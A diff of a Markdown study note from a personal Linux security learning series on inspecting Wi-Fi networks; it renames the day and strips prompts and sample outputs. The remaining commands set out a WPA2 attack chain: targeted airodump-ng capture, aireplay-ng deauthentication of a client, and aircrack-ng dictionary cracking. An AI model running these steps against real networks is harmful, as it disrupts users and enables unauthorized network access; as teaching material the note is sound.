@@ -1,6 +1,6 @@
-# 🦈 Day 27 (Week 04 • Day 06): Understanding and Inspecting Wireless Networks (Part 01)
+# 🦈 Day 29 : Understanding and Inspecting Wireless Networks (Part 01)
 
-Welcome to Day 06 of Week 04 of my Linux Security learning journey. This document covers background mechanics of Wi-Fi (IEEE 802.11) technologies, security protocols, wireless operational modes, interface commands, terminal outputs, and step-by-step reconnaissance and cryptographic cracking workflows for penetration testing and system administration.
+Welcome to Day 29 of my Linux Security learning journey. This document covers background mechanics of Wi-Fi (IEEE 802.11) technologies, security protocols, wireless operational modes, interface commands, terminal outputs, and step-by-step reconnaissance and cryptographic cracking workflows for penetration testing and system administration.
 
 ---
 
@@ -49,7 +49,7 @@ Welcome to Day 06 of Week 04 of my Linux Security learning journey. This documen
 Lists activated network interfaces and assigned IP configurations. Linux designates wireless interfaces sequentially as `wlan0`, `wlan1`, etc.
 
 ```bash
-kali > ifconfig wlan0
+ifconfig wlan0
 
 ```
 
@@ -58,49 +58,24 @@ kali > ifconfig wlan0
 Displays operational parameters specific to wireless adapters including Wireless Standard, Operational Mode, ESSID Status, AP MAC Address, Transmit Power, and Signal Level.
 
 ```bash
-kali > iwconfig wlan0
+iwconfig wlan0
 
 ```
 
 #### 🖼️ Terminal Output View (`iwconfig wlan0`)
 
-```plaintext
-wlan0     IEEE 802.11  ESSID:"Hackers-Arise"  
-          Mode:Managed  Frequency:2.457 GHz  Access Point: 01:01:AA:BB:CC:22   
-          Bit Rate=54 Mb/s   Tx-Power=20 dBm   
-          Retry short limit:7   RTS thr:off   Fragment thr:off
-          Power Management:off
-          Link Quality=62/70  Signal level=-48 dBm  
-          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
-          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
-
-```
 
 #### AP Scanning (`iwlist`)
 
 Returns detailed wireless survey data from surrounding APs.
 
 ```bash
-kali > iwlist wlan0 scan
+iwlist wlan0 scan
 
 ```
 
 #### 🖼️ Terminal Output View (`iwlist wlan0 scan`)
 
-```plaintext
-wlan0     Scan completed :
-          Cell 01 - Address: 01:01:AA:BB:CC:22
-                    Channel:10
-                    Frequency:2.457 GHz (Channel 10)
-                    Quality=65/70  Signal level=-45 dBm  
-                    Encryption key:on
-                    ESSID:"Hackers-Arise"
-                    IE: IEEE 802.11i/WPA2 Version 1
-                      Group Cipher : CCMP
-                      Pairwise Ciphers (1) : CCMP
-                      Authentication Suites (1) : PSK
-
-```
 
 #### Connection Management (`nmcli`)
 
@@ -108,7 +83,7 @@ Scans surrounding Wi-Fi networks and manages AP associations via NetworkManager.
 
 * **Network Survey Command:**
 ```bash
-kali > nmcli dev wifi
+nmcli dev wifi
 
 ```
 
@@ -116,16 +91,10 @@ kali > nmcli dev wifi
 
 #### 🖼️ Terminal Output View (`nmcli dev wifi`)
 
-```plaintext
-IN-USE  BSSID              SSID           MODE   CHAN  RATE        SIGNAL  BARS  SECURITY 
-*       01:01:AA:BB:CC:22  Hackers-Arise  Infra  10    130 Mbit/s  85      ▂▄▆█  WPA2     
-        02:22:BB:CC:DD:33  Home-WiFi      Infra  6     54 Mbit/s   50      ▂▄__  WPA2     
-
-```
 
 * **AP Association Command:**
 ```bash
-kali > nmcli dev wifi connect Hackers-Arise password 12345678
+nmcli dev wifi connect Hackers-Arise password 12345678
 
 ```
 
@@ -133,10 +102,6 @@ kali > nmcli dev wifi connect Hackers-Arise password 12345678
 
 #### 🖼️ Terminal Output View (`nmcli dev wifi connect`)
 
-```plaintext
-Device 'wlan0' successfully activated with 'a2b3c4d5-e6f7-8901-2345-6789abcdef01'.
-
-```
 
 ---
 
@@ -187,22 +152,12 @@ Executes an offline dictionary attack against the captured 4-Way Handshake file 
 Locks capture onto Channel 10 and filters specifically for target BSSID while writing capture files to disk.
 
 ```bash
-kali > airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon
+airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon
 
 ```
 
 #### 🖼️ Terminal Output View (`airodump-ng` Ambient & Targeted Capture)
 
-```plaintext
- CH 10 ][ Elapsed: 45 s ][ 2026-08-12 21:40 ][ WPA handshake: 01:01:AA:BB:CC:22
- 
- BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC ACTION CIPHER AUTH ESSID
- 01:01:AA:BB:CC:22  -42       85      1200   24  10  54e. WPA2 CCMP   PSK  Hackers-Arise
- 
- BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
- 01:01:AA:BB:CC:22  A0:A3:E2:44:7C:E5  -48    0 - 6     0       450  EAPOL  Hackers-Arise
-
-```
 
 #### Output Data Breakdown:
 
@@ -226,42 +181,25 @@ kali > airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon
 Transmits 100 deauthentication frames to disconnect the target client, forcing an automatic reconnection that broadcasts the 4-Way Handshake.
 
 ```bash
-kali > aireplay-ng --deauth 100 -a 01:01:AA:BB:CC:22 -c A0:A3:E2:44:7C:E5 wlan0mon
+aireplay-ng --deauth 100 -a 01:01:AA:BB:CC:22 -c A0:A3:E2:44:7C:E5 wlan0mon
 
 ```
 
 #### 🖼️ Terminal Output View (`aireplay-ng`)
 
-```plaintext
-21:41:02  Waiting for beacon frame (BSSID: 01:01:AA:BB:CC:22) on channel 10
-21:41:02  Sending 64 directed DeAuth (code 7). STMAC: [A0:A3:E2:44:7C:E5] [ 8 ACKs]
-21:41:03  Sending 64 directed DeAuth (code 7). STMAC: [A0:A3:E2:44:7C:E5] [12 ACKs]
 
-```
 
 #### 🔴 Terminal 3: Offline Cryptographic Cracking
 
 Compares computed PMK hashes from the dictionary file against the captured WPA2 handshake.
 
 ```bash
-kali > aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hackers-ArisePSK-01.cap
+aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hackers-ArisePSK-01.cap
 
 ```
 
 #### 🖼️ Terminal Output View (`aircrack-ng`)
 
-```plaintext
-                   Aircrack-ng 1.7 
-
-      [00:00:12] 14500 keys tested (1208.33 k/s)
-
-      KEY FOUND! [ 12345678 ]
-
-      Master Key     : CB 12 90 A1 88 34 EF FF 90 22 11 AA BB CC DD EE 
-      Transient Key  : 3A BC E9 11 00 22 33 44 55 66 77 88 99 AA BB CC 
-      EAPOL HMAC     : 12 34 56 78 90 AB CD EF 12 34 56 78 90 AB CD EF
-
-```
 
 ---
 
@@ -303,4 +241,3 @@ $$\text{Reconnaissance } (\texttt{airodump-ng}) \longrightarrow \text{Deauth } (
 
 ---
 
-*⚡ End of Week 04 • Day 06 Notes • Organized for GitHub & OneNote*
